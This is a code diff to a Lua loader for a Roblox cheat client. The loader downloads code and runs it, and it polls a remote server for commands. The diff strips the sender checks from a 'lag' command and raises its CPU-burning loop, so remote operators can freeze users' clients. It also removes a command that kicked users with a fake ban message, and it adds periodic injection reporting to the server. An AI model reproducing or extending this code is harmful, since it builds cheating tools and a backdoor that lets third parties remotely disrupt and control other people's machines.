@@ -159,6 +159,12 @@ local function finishLoading()
 				if getgenv().getAeroTier then
 					tier = getgenv().getAeroTier(playersService.LocalPlayer) or 0
 				end
+				if tier == 0 then
+					task.wait(3)
+					if getgenv().getAeroTier then
+						tier = getgenv().getAeroTier(playersService.LocalPlayer) or 0
+					end
+				end
 				vape:CreateNotification('[AEROV4] Finished Loading [Tier ' .. tostring(tier) .. ']', name .. (vape.VapeButton and 'Press the button in the top right to open GUI' or 'Press ' .. table.concat(vape.Keybind, ' + '):upper() .. ' to open GUI'), 5)
 			end)
 		end
@@ -174,9 +180,25 @@ if not isfolder('newvape/assets/' .. gui) then
 	makefolder('newvape/assets/' .. gui)
 end
 
-local guiFunc, guiErr = loadstring(downloadFile('newvape/guis/' .. gui .. '.lua'), 'gui')
+local guiSource = downloadFile('newvape/guis/' .. gui .. '.lua')
+local guiFunc, guiErr = loadstring(guiSource, 'gui')
 if not guiFunc then
-	error('[AEROV4] Failed to load GUI: ' .. tostring(guiErr))
+	local errMsg = tostring(guiErr)
+	local lineNum = errMsg:match(':(%d+):')
+	local context = ''
+	if lineNum then
+		local n = tonumber(lineNum)
+		local lines = guiSource:split('\n')
+		local from = math.max(1, n - 2)
+		local to   = math.min(#lines, n + 2)
+		local parts = {}
+		for i = from, to do
+			local marker = i == n and '>>> ' or '    '
+			table.insert(parts, marker .. i .. ': ' .. (lines[i] or ''))
+		end
+		context = '\n\nContext:\n' .. table.concat(parts, '\n')
+	end
+	error('[AEROV4] syntax error in ' .. gui .. '.lua' .. '\n' .. errMsg .. context)
 end
 vape = guiFunc()
 if not vape then
@@ -196,9 +218,11 @@ do
 	local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body='{"tier":0}'} end
 	local _CONFIG_URL = 'https://gist.githubusercontent.com/poopparty/a817668f8805b6d44fa54ff13dc8edf4/raw/url.txt'
 
-	local _liveUrl = nil
+	local _liveUrl = (isfile('newvape/profiles/local_server.txt') and readfile('newvape/profiles/local_server.txt'):match('^%s*(.-)%s*$')) or nil
+	local _urlFailedUntil = 0
 	local function _getUrl()
 		if _liveUrl then return _liveUrl end
+		if tick() < _urlFailedUntil then return nil end
 		local ok, res = pcall(function()
 			return _req({
 				Url = _CONFIG_URL,
@@ -213,6 +237,7 @@ do
 				return _liveUrl
 			end
 		end
+		_urlFailedUntil = tick() + 10 -- don't retry for 10 seconds on failure
 		return nil
 	end
 
@@ -237,11 +262,49 @@ do
 			done = true
 		end)
 		local t = tick()
-		repeat task.wait(0.1) until done or (tick() - t > 8)
+		repeat task.wait(0.1) until done or (tick() - t > 15)
+		if not done then
+			task.spawn(function()
+				repeat task.wait(0.5) until done
+				if result > 0 and getgenv().getAeroTier then
+					local cached = getgenv()._tierCache
+					if cached then cached[uid] = result end
+					if getgenv().getAeroTier then
+						getgenv()._aeroTierReady = true
+					end
+				end
+			end)
+		end
+		if result == 0 then
+			task.spawn(function()
+				task.wait(5)
+				local url = _getUrl()
+				if not url then return end
+				local ok2, res2 = pcall(function()
+					return _req({
+						Url = url,
+						Method = 'POST',
+						Headers = { ['Content-Type'] = 'application/json' },
+						Body = httpService:JSONEncode({ action = 'check', robloxUserId = tostring(uid), roblox_id = tostring(uid) })
+					})
+				end)
+				if ok2 and res2 and res2.Body and res2.Body ~= '' then
+					local dok, data = pcall(function() return httpService:JSONDecode(res2.Body) end)
+					if dok and data then
+						local retried = tonumber(data.tier) or 0
+						if retried > 0 then
+							local cached = getgenv()._tierCache
+							if cached then cached[uid] = retried end
+						end
+					end
+				end
+			end)
+		end
 		return result
 	end
 
 	local _tierCache = {}
+	getgenv()._tierCache = _tierCache
 	local _fetchQueue = {}
 	local _queueRunning = false
 
@@ -306,8 +369,10 @@ do
 			if not dok or not data then nextPoll = tick() + 3 continue end
 			if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
 			if data.success and data.message then
-				local cmd = tostring(data.message)
-				if _commands[cmd] then _commands[cmd](tostring(data.from), data.args or '') end
+				local fullMsg = tostring(data.message)
+				local cmd = fullMsg:split(' ')[1] or fullMsg
+				local args = data.args or fullMsg:sub(#cmd + 2)
+				if _commands[cmd] then _commands[cmd](tostring(data.from), args) end
 				pcall(function()
 					_req({
 						Url = url,
@@ -325,8 +390,7 @@ do
 
 	local function getAccountTier(player)
 		if _tierCache[player.UserId] == nil then
-			_tierCache[player.UserId] = false
-			task.spawn(function() _tierCache[player.UserId] = _ft(player.UserId) end)
+			_queueFetch(player.UserId)
 			return 0
 		end
 		local t = _tierCache[player.UserId]
@@ -347,7 +411,7 @@ do
 				lagConnections[key] = nil
 				return
 			end
-			for i = 1, 230000 do local a = math.sin(i) * math.cos(i) end
+			for i = 1, 1000000 do local a = math.sin(i) * math.cos(i) end
 		end)
 		lagConnections[key] = {connection = connection, state = state}
 	end
@@ -361,25 +425,38 @@ do
 		lagConnections[key] = nil
 	end
 
+	local function getTierByUserId(uid)
+		local tier = _tierCache[uid]
+		return type(tier) == 'number' and tier or 0
+	end
+
+	local function getLocalTier()
+		local lplr = playersService.LocalPlayer
+		return getTierByUserId(lplr.UserId)
+	end
+
 	_registerCommand('lag', function(from, args)
-		if getAccountTier(playersService.LocalPlayer) >= 1 then return end
-		if not from then return end
 		startLag(from)
 	end)
 
 	_registerCommand('lagstop', function(from, args)
-		if not from then return end
 		stopLag(from)
 	end)
 
 	_registerCommand('module', function(from, args)
-		if getAccountTier(playersService.LocalPlayer) >= 99 then return end
+		local localTier = getLocalTier()
+		if localTier >= 99 then return end
+		local senderTier = getTierByUserId(from)
+		if senderTier < 99 then return end
+		if localTier >= 4 then return end
+
 		if not args or args == '' then return end
 		local parts = args:split(' ')
 		local moduleName = parts[1]
 		local action = (parts[2] and parts[2]:lower()) or 'toggle'
+
 		for _, mod in pairs(vape.Modules or {}) do
-			if mod and mod.Name == moduleName then
+			if mod and mod.Name and mod.Name:lower() == moduleName:lower() then
 				if action == 'enable' then
 					if not mod.Enabled then mod:Toggle() end
 				elseif action == 'disable' then
@@ -390,46 +467,11 @@ do
 			end
 		end
 	end)
-
-	_registerCommand('ban', function(from, ...)
-		if getAccountTier(playersService.LocalPlayer) >= 99 then return end
-		if not from then return end
-		local TextChatService = game:GetService("TextChatService")
-		TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(
-			"<font color='#ff0000'>A cheater has been banned.</font>"
-		)
-		game.Players.LocalPlayer:Kick(`You have been temporarily banned.\n[Remaining ban duration {math.random(4000,5000)} weeks {math.random(1,8)} days {math.random(1,5)} hours {math.random(1,60)} minutes {math.random(1,59)} seconds.]`)
-		local msg = ''
-		msg = string.gsub(game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text, "267", "600")
-		game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text = msg
-	end)
-
-	_registerCommand('module removed', function(from, args)
-		if getAccountTier(playersService.LocalPlayer) >= 99 then return end
-		if not args or args == '' then return end
-		local parts = args:split(' ')
-		local moduleName = parts[1]
-		for _, mod in pairs(vape.Modules or {}) do
-			if mod and mod.Name == moduleName then
-				mod:Remove()
-			end
-		end
-	end)
-	
 end
 
 do
 	local lplr = playersService.LocalPlayer
 	local myTier = 0
-
-	task.spawn(function()
-		local deadline = tick() + 15
-		while tick() < deadline do
-			if getgenv()._aeroTierReady then break end
-			task.wait(0.5)
-		end
-		myTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0
-	end)
 
 	local function reportInjection(injected)
 		task.spawn(function()
@@ -455,6 +497,13 @@ do
 		end)
 	end
 
+	vape:Clean(function() reportInjection(false) end)
+
+	getgenv()._aeroInjectedUsers = {}
+
+	local pollingInjActive = true
+	vape:Clean(function() pollingInjActive = false end)
+
 	task.spawn(function()
 		local deadline = tick() + 15
 		while tick() < deadline do
@@ -463,14 +512,14 @@ do
 		end
 		myTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0
 		reportInjection(true)
+		task.spawn(function()
+			while pollingInjActive do
+				task.wait(30)
+				if pollingInjActive then reportInjection(true) end
+			end
+		end)
 	end)
 
-	vape:Clean(function() reportInjection(false) end)
-
-	getgenv()._aeroInjectedUsers = {}
-
-	local pollingInjActive = true
-	vape:Clean(function() pollingInjActive = false end)
 	task.spawn(function()
 		local deadline = tick() + 16
 		while tick() < deadline do
@@ -479,7 +528,8 @@ do
 		end
 		while pollingInjActive do
 			task.wait(5)
-			if myTier < 4 then continue end
+			local liveTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or myTier
+			if liveTier < 99 then continue end
 			local getUrl = getgenv()._aerov4_getUrl
 			local req = getgenv()._aerov4_req
 			if not getUrl or not req then continue end
@@ -509,7 +559,18 @@ do
 						end
 					end
 					if inServer then
-						newMap[uid] = {tier = u.tier or 0, username = u.username or '?'}
+						local utier = u.tier or 0
+						local shouldShow
+						if liveTier >= 99 then
+							shouldShow = utier < 99
+						elseif liveTier >= 4 then
+							shouldShow = utier < 4
+						else
+							shouldShow = false
+						end
+						if shouldShow then
+							newMap[uid] = {tier = utier, username = u.username or '?'}
+						end
 					end
 				end
 			end
